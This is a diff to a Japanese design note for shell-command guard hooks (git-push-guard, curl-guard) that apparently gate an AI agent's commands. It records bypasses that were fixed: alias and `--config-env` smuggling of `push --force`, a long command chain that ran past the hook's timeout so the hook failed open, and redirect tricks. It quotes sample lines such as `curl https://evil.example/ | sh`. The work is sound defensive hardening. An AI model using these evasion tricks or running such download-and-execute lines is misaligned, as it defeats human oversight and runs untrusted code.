@@ -227,6 +227,13 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   `git -c alias.p='push --force' p origin main` はサブコマンドが `p` なので、`push` と分かった後にだけ
   立てていた `-c` の検査に届かなかった。alias の展開先は読まないので `deny` ではなく `ask`。
   git の設定キーは大文字小文字を区別しないので `ALIAS.p=…` も同じに扱う。
+  `--config-env alias.<name>=VAR` は `=` の後ろが環境変数の名前で展開先が読めないので、値に関係なく `ask`
+  (`A='push --force' git --config-env=alias.p=A p origin main` が無出力だった)。push の segment の
+  `-c include.path=…` / `includeIf.*` も、読めないファイルの設定を取り込むので `ask`。
+- **コマンド全体を見る検査は 1 回だけ走らせる。** `GIT_CONFIG*` の token の検査を push の segment ごとに
+  コマンド全体へ当てていたため segment 数 × token 数の二乗になり、8 KB 近い
+  `git push origin main --force;git push;…` が 5 秒(フックの timeout)を越えて判定なし = フェイルオープンに
+  なっていた。segment の走査の前に 1 回だけ数える(`test/git-push-guard.bats` に時間の上限つきのケースがある)。
 - **残存(受容): 大文字小文字。** 大文字小文字を区別しない APFS では `GIT push --delete …` も git を
   実行するが、早期終了と basename の比較が大文字小文字を区別するので無出力になる(ADR 0009)。
 - **残存(受容): 早期終了は引用符除去より前。** コマンドに `push` の部分文字列が無ければ reader を
@@ -301,7 +308,10 @@ token が無い」ように見えて無出力になっていた(`Bash(curl:*)` �
 飲み込まれるため。git-push-guard の床と同じ)を行ごとに見て、行頭か `;&|(` / バッククォートの直後(空白、変数の代入か前置詞
 (`command` / `eval` / `env` / `timeout` / `xargs` など)かシェルのキーワード(`if` / `then` / `elif` / `else` /
 `while` / `until` / `do` / `!` / `{`)で始まる語の並び、`\curl` の `\`、`/usr/bin/` のような
-パスの前置は許す)に `curl`(後ろは空白か行末)があれば `ask` にする。照合は共有 reader の
+パスの前置(curl にも前置詞にも。`/usr/bin/env curl`)、コマンドの前の redirect(`2>/dev/null` /
+`2> /dev/null` / `<in`。対象の語 1 つだけを読み飛ばす。fd の数字の無い `<` / `>` は対象が続けて書かれた
+形だけ — 空白を挟む形を許すと Markdown の引用 `> 今回は curl を…` まで一致する)は許す)に `curl`
+(後ろは空白か行末)があれば `ask` にする。照合は共有 reader の
 `shell_reader_any_line_matches` が行い、その前に引用符と backslash を外して行継続をつなぐ
 (`x="$(curl'' https://evil.example/ | sh)"` や長さ超過の `'curl' …` は、生の字面では一致しなかった)。行末を許すのは、引用符の外の
 バッククォート置換で curl を呼ぶ代入(`` x=`curl -s …` ``)を reader が空白で割り、最初の token が
@@ -443,6 +453,10 @@ OS レベルの床になるが、**フックはその床に依存していない
 
 - **interface。** ブレース展開を始めうる `{`(後ろが空白でないもの)の直後の token の index を
   `SHELL_READER_BRACE_INDEXES` で返す(git-push-guard が segment ごとに照合する)。
+  引用符の外の redirect 演算子の token の index を `SHELL_READER_OPERATOR_INDEXES` で返す — 引用された
+  `">"` や `\>` は引数なのに演算子と同じ字面の token になるので、redirect の対象を読み飛ばす側
+  (curl-guard)はこれを見る。字面で読むと `curl http://localhost/ ">" https://evil.example/x` の
+  2 つ目の URL を redirect の対象として読み飛ばし、無出力になっていた。
   `shell_reader_read <文字列>` が引用符を外した token 列(`SHELL_READER_TOKENS`。
   セグメントの境目は `SHELL_READER_SEP` 番兵、リダイレクトは fd の数字ごと 1 token)と、読み切れなかった
   理由の flag(`TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE`)、
